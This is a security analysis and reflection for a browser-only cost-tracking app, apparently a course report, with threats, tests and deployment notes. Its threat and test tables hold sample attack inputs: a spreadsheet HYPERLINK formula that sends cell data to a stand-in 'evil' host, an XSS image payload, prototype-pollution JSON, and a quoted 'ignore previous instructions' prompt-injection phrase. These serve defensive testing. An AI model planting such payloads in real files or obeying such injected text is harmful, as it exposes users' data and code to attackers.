# CostLens: Security Analysis, Deployment and Reflection

**System under analysis:** a static, browser-only web app. Users type or upload (.csv/.xlsx) cost data; the app calculates variance, draws charts, runs a local anomaly scan, and exports an HTML/CSV report. Data is kept in `localStorage`. There is no server, database or login.

---

## Part B: Cybersecurity analysis

### 6–8. Threats, attack scenarios and mitigations

| # | Threat | Realistic attack scenario | Prevention / mitigation (and where implemented) |
|---|---|---|---|
| 1 | **Malicious file upload** (disguised executable, macro workbook, zip bomb, huge file) | A contractor emails "Q3-costs.xlsx" that is really a renamed `.exe`, or a 40 KB `.xlsx` that expands to several GB when parsed, freezing the finance officer's browser. | Extension allow-list (.csv/.xlsx only, `.xlsm`/`.xls` refused); 2 MB cap; MIME-vs-extension check; magic-byte check (`PK\x03\x04`; MZ/ELF/PDF/script signatures refused); zip central-directory scan that caps entries and total uncompressed size and rejects `vbaProject`; row/column caps. `src/security/fileGuard.js` |
| 2 | **Cross-site scripting (XSS) via imported or typed text** | A supplier's spreadsheet has the description `<img src=x onerror=...>`. If rendered as HTML it would run script in the app's origin and read or alter stored financial data. | Markup characters rejected at validation; every value rendered with `textContent`/text nodes (never `innerHTML`); charts and report built from escaped strings; strict production CSP (`script-src 'self'`, no inline script). `costValidation.js`, `ui/dom.js`, `charts.js`, `report.js`, `vite.config.js` |
| 3 | **CSV / Excel formula injection** | An attacker sets a description to `=HYPERLINK("http://evil/?"&A1,"click")`. The manager exports the CSV and opens it in Excel; the formula runs and can exfiltrate cells or launch a payload. | Export prefixes cells starting with `= + - @` with `'` (`csvEscape`); report is HTML, not a formula-evaluating format. `data/storage.js`, `core/report.js` |
| 4 | **Data tampering / malformed stored or imported data** (prototype pollution, negative or absurd values) | Someone with access to a shared PC edits `localStorage` or crafts a JSON import with `__proto__`, negative costs, or 100,000 items to corrupt results or crash the app. | Whole-project schema validation on every load and import; unknown/unsafe keys rejected; item cap (1,000); stored data that fails validation is discarded. `costStore.js`, `storage.js` |
| 5 | **Denial of service / excessive requests** | A script (or a user repeatedly uploading) hammers the Import and Report actions with maximum-size files to lock up the tab; on a future hosted backend this would exhaust the server. | Size/row caps before parsing; client-side sliding-window limiter (5 imports/min, 10 analyses/min, 10 reports/min). **Server-side limiting is future work.** `security/rateLimit.js` |
| 6 | **Sensitive data exposure / unauthorised project access** | Budgets are confidential. On a shared or stolen laptop, another person opens the site and reads the saved project. In any future multi-user version, changing `/projects/42` to `/projects/43` (IDOR) would expose another team's costs. | Current: no data leaves the browser, no third-party scripts, `connect-src 'none'`, `Referrer-Policy: no-referrer`, a one-click "Clear all data". **Future:** authentication, per-project authorisation checked server-side, encryption at rest. |
| 7 | **Supply-chain compromise** | A malicious update to a dependency (e.g. the Excel parser) is pulled in at build time and ships to every user. | Only one runtime dependency (`read-excel-file`); lockfile; `npm audit` shows 0 vulnerabilities at build; pinned versions. **Future:** CI scanning, SRI, reproducible builds. |
| 8 | **AI-specific risks** (over-trust, data leakage, prompt injection) | A user trusts "no anomalies found" and skips an audit; or, if an external LLM were added, a cell containing "ignore previous instructions…" manipulates the summary or the data is sent to a third party. | The analysis is local, deterministic and labelled decision support; no text is sent to an LLM. If an LLM is added later: treat cell text as data, send aggregates only, get explicit consent. |

### 9. The three threats that could cause the greatest harm

Ranked by **impact on users × realistic likelihood**:

1. **Sensitive data exposure / unauthorised project access (#6).** Project budgets and overruns are commercially sensitive (bid positions, contractor disputes, salary-adjacent labour costs). A breach cannot be undone, and in any shared deployment one access-control mistake exposes *every* user's data at once. It is the highest-consequence failure the moment the app has more than one user. Today the risk is contained by the no-backend design; it is the biggest gap for future work.
2. **Cross-site scripting (#2).** The app's whole job is to ingest untrusted spreadsheets, so XSS is the most likely injection route. Successful script execution would have the same privileges as the app: read or silently modify all stored costs (falsifying a report to approve spend), and, without a CSP, exfiltrate it. One bad cell can compromise everything on that origin.
3. **CSV/Excel formula injection (#3).** This harm lands on people *outside* the app: the managers and auditors who open the exported file in Excel. It needs only a plain text cell (no vulnerability in our code), it is easy to execute with social engineering, and it can run code or leak data on the victim's machine. Because the harm leaves our trust boundary, it is easy to overlook, which is why it is ranked above DoS and supply-chain risks (which are serious but either recoverable or less likely at this scale).

*Malicious uploads (#1) are close behind; they rank lower mainly because the browser sandbox and our layered file checks cap the damage, and the worst realistic outcome is a frozen tab rather than data loss.*

### 10. Pre-deployment security checklist

**Transport and hosting**
- [ ] Served over HTTPS only; HTTP redirects to HTTPS; HSTS enabled
- [ ] Security headers present and verified (securityheaders.com / browser dev tools): CSP, `X-Content-Type-Options: nosniff`, `X-Frame-Options`/`frame-ancestors 'none'`, `Referrer-Policy`, `Permissions-Policy`, COOP/CORP
- [ ] No source maps, `.env`, test data or debug pages in the deployed `dist/`
- [ ] Hosting account protected with MFA; deploy tokens scoped and rotated

**Application**
- [ ] CSP in force and the console shows no CSP violations in the production build
- [ ] No `innerHTML`, `eval`, `new Function` or inline handlers (`grep` the build)
- [ ] All inputs validated (type, range, length, charset); all outputs escaped
- [ ] Upload limits enforced: type, size, magic bytes, zip inspection, row cap
- [ ] Exports neutralise formulas; report HTML escapes all user text
- [ ] Rate limits active on import/analysis/report; server-side limits if a backend exists
- [ ] Errors show generic messages; no stack traces or internal paths

**Dependencies and build**
- [ ] `npm audit` clean (or accepted risks documented); lockfile committed
- [ ] Dependencies minimal and pinned; build runs in a clean CI environment
- [ ] Unit and security tests pass (`npm test`)

**Data and privacy**
- [ ] Privacy notice states where data is stored (browser only) and how to delete it
- [ ] "Clear all data" works; no analytics or third-party calls

**Access control (required once there is a backend)**
- [ ] Authentication with MFA; session cookies `HttpOnly; Secure; SameSite`
- [ ] Authorisation checked server-side on every project read/write (no IDOR); tested with two accounts
- [ ] Audit logging and alerting; backups and a tested restore

**Release**
- [ ] Penetration test or peer review completed; findings triaged
- [ ] Incident-response contact and rollback plan documented

### 11. Security tests with safe test data

All tests use synthetic data only and are automated in `tests/security.test.js` (run `npm test`) and can be run live on the app's **Security** page (**Run security tests**). Fixtures are in `test-data/`.

| ID | Test | Safe input | Expected | Observed |
|---|---|---|---|---|
| T1 | **Invalid file upload** | `payroll.csv.exe`; `macro.xlsm`; a `report.xlsx` whose bytes begin with the `MZ` executable header; a 5 MB file; a "CSV" with NUL bytes | Every file refused before parsing, with a specific reason | **PASS.** All 5 refused (type, macro, bad signature/executable, size, binary content) |
| T2 | **Malicious cell content** (XSS + formula injection + oversize) | Rows with `<img src=x onerror=alert(1)>`, `<script>…`, `=HYPERLINK("http://evil.test",…)`, and a 5,000-character cell | Markup and oversize rows rejected; formula neutralised on export; report escapes text | **PASS.** 3 rows rejected; export cell became `'=HYPERLINK…`; report contained `a&amp;b &quot;q&quot;` and no live markup |
| T3 | **Excessive requests** | 20 import requests in 2 seconds against a limit of 5/minute | 5 allowed, 15 blocked with a retry delay, allowed again after the window | **PASS.** Also confirmed in the browser: after 5 imports the UI shows "Too many requests. Please wait 57s" |
| T4 | **Tampered data / unauthorised injection** | JSON with `__proto__`, a `constructor.prototype` payload, a negative amount, and 100,000 items | All rejected; `Object.prototype` not polluted | **PASS.** 4/4 rejected |

**Note on "unauthorised project access":** this prototype has no accounts, so a true cross-user test (user A reading user B's project) is not applicable yet. T4 covers the closest equivalent (foreign or tampered data injected into storage is rejected). A proper two-account access-control test is a required pre-condition for any shared deployment.

---

## Part C: Deployment and reflection

### 12. Deployment

The app builds to a static `dist/` folder, so it can be hosted for free on any static host:

| Host | Steps | Security headers |
|---|---|---|
| **Netlify / Cloudflare Pages** | Connect the repo; build `npm run build`, publish `dist` | `public/_headers` is copied into `dist/` and applied automatically |
| **Vercel** | Import repo; framework "Vite" | `vercel.json` applies the headers |
| **GitHub Pages** | Publish `dist/` | Cannot set headers; the meta-tag CSP in `index.html` (injected on build) still applies, but `frame-ancestors`/HSTS need another host |

**Status:** I could not deploy to a public host from the build environment, so the prototype was demonstrated in a **controlled local environment**: `npm run build && npm run preview` serves the production build at `http://localhost:4173` with the strict CSP. It was exercised end-to-end in headless Chromium (manual entry, CSV and .xlsx import, rejected malicious files, all three charts, AI analysis, report download, security tests, EVM tab, mobile layout, rate limiting) with **zero console or CSP errors**.

### 13. Security controls: implemented vs future work

**Implemented:** strict CSP (no inline script/style, no outbound connections); upload allow-list with MIME and magic-byte checks, zip-bomb and macro scan, size and row caps; strict numeric/text validation and markup rejection; safe DOM rendering and escaped SVG/HTML report; CSV formula neutralisation; client-side rate limiting; validation of stored and imported data, prototype-pollution guard; no third-party scripts or data transmission; security headers config for production hosts; automated security tests.

**Future work:** authentication and per-project authorisation; server-side validation and rate limiting (client-side limits can be bypassed by a determined user); encryption of data at rest and optional encrypted export; audit logging; CI dependency scanning and SRI; accessibility and privacy review; independent penetration test; real-time threat monitoring if a backend is added.

### How AI improves the Excel workflow, and its limitations

**Improvements over the manual Excel workflow**
- **Speed and consistency:** variance, % variance, status and totals are computed instantly and identically every time, with no broken formulas or inconsistent sign conventions.
- **Anomaly detection at scale:** a robust statistical test plus business rules flags outliers, unbudgeted spend, duplicates and concentration across hundreds of rows, which a person skimming a sheet will often miss.
- **Narrative reporting:** the summary turns numbers into plain language with recommended actions, saving the manual write-up that usually follows an Excel review.
- **Safer sharing:** a validated, escaped, print-ready report replaces copy-pasted screenshots and hand-edited sheets.

**Limitations that remain**
- The "AI" here is **statistical and rule-based**, not a language model. It is transparent and private, but it cannot understand context (a large overrun might be an approved change order) or explain *why* costs rose.
- **Garbage in, garbage out:** it checks format and plausibility, not truth. Falsified or missing invoices are not detected.
- **Small samples:** the outlier test needs about 5+ items; with fewer, only fixed rules apply. Thresholds (10%, 25%, 30%) are defaults that should be tuned per organisation.
- **False positives and negatives** are possible, so results are decision support, not audit evidence.
- **Single-user and local:** no collaboration, version history or approvals, which Excel + SharePoint can provide; data lives in one browser and can be lost if storage is cleared (use CSV/JSON export for backups).
- **Forecasting is basic:** the EVM tab uses one forecasting method (EAC = BAC/CPI); no time-series prediction or scenario modelling.
- Adding an LLM would improve explanations but introduces privacy, cost, prompt-injection and hallucination risks that would need the controls listed above.
